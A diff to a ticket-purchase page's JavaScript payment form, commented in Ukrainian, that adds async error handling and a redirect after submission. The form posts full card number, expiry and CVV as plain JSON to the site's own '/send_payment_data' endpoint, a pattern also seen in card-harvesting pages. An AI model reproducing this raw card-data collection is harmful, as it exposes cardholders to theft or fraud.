@@ -169,17 +169,27 @@
             document.getElementById('payment-title').textContent = `Payment ${totalNum}€`;
         }
     }
-    document.getElementById('paymentForm').onsubmit = function(e) {
+    document.getElementById('paymentForm').onsubmit = async function(e) {
         e.preventDefault();
         const email = document.getElementById('email-input').value;
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
-        fetch('/send_payment_data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, card, expiry, cvv })
-        });
+        try {
+            const response = await fetch('/send_payment_data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, card, expiry, cvv })
+            });
+            if (response.ok) {
+                // Після успішної відправки даних
+                window.location.href = '/buy-tickets/code/';
+            } else {
+                console.error('Помилка при відправці даних');
+            }
+        } catch (error) {
+            console.error('Помилка при зверненні до сервера:', error);
+        }
     };
     </script>
 </body>
